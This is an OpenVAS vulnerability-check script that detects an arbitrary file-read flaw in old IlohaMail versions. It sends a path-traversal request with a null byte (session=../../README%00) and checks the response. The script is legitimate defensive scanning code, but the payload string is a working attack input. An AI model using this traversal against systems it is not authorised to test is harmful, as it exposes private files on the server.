# OpenVAS Vulnerability Test
# $Id: ilohamail_arbitrary_file_access_via_session.nasl 9348 2018-04-06 07:01:19Z cfischer $
# Description: IlohaMail Arbitrary File Access via Session Variable Vulnerability
#
# Authors:
# George A. Theall, <theall@tifaware.com>.
#
# Copyright:
# Copyright (C) 2004 George A. Theall
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "The target is running at least one instance of IlohaMail version
0.7.11 or earlier.  Such versions contain a flaw in the processing of
the session variable that allows an unauthenticated attacker to
retrieve arbitrary files available to the web user, provided the
filesystem backend is in use.";

tag_solution = "Upgrade to IlohaMail version 0.7.12 or later.";

if (description) {
  script_oid("1.3.6.1.4.1.25623.1.0.14631");
  script_version("$Revision: 9348 $");
  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:01:19 +0200 (Fri, 06 Apr 2018) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");

  script_xref(name:"OSVDB", value:"7335");
 
  name = "IlohaMail Arbitrary File Access via Session Variable Vulnerability";
  script_name(name);
 
  summary = "Checks for Arbitrary File Access via Session Variable vulnerability in IlohaMail";
 
  script_category(ACT_GATHER_INFO);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("This script is Copyright (C) 2004 George A. Theall");

  family = "Remote file access";
  script_family(family);

  script_dependencies("global_settings.nasl", "ilohamail_detect.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  exit(0);
}

include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");

# Specify the file to grab from target, relative to IlohaMail/sessions 
# directory.
#
# nb: ../../README exists in each version I've seen.
file = "../../README";

host = get_host_name();
port = get_http_port(default:80);
if (debug_level) display("debug: searching for IlohaMail Arbitrary File Access via Session Variable vulnerability on ", host, ":", port, ".\n");

# Check each installed instance, stopping if we find a vulnerable version.
installs = get_kb_list(string("www/", port, "/ilohamail"));
if (isnull(installs)) exit(0);
foreach install (installs) {
  matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
  if (!isnull(matches)) {
    ver = matches[1];
    dir = matches[2];
    if (debug_level) display("debug: checking version ", ver, " under ", dir, ".\n");

    # Try to exploit the vulnerability.
    #
    # nb: the hole exists because session_auth.FS.inc trusts
    #     the session variable when calling include_once() to 
    #     validate the session.
    url = string(dir, "/index.php?session=", file, "%00");
    if (debug_level) display("debug: retrieving ", url, "...\n");
    req = http_get(item:url, port:port);
    res = http_keepalive_send_recv(port:port, data:req);
    if (res == NULL) exit(0);           # can't connect
    if (debug_level) display("debug: res =>>", res, "<<\n");

    # nb: if successful, file contents will appear after the closing 
    #     HEAD tag; otherwise, there will be a message about a session
    #     timeout. Regardless, we only need check the first 5 lines or so.
    lines = split(res);
    nlines = max_index(lines) - 1;
    for (i = 0; i <= nlines; i++) {
      if (lines[i] =~ "</HEAD>") {
        next = lines[i+1];
        if (debug_level) display("debug: next=>>", next, "<<\n");
        if (next !~ "Session timeout") {
          security_message(port);
          exit(0);
        }
        # nb: no need to check any further.
        break;
      }
    }
  }
}
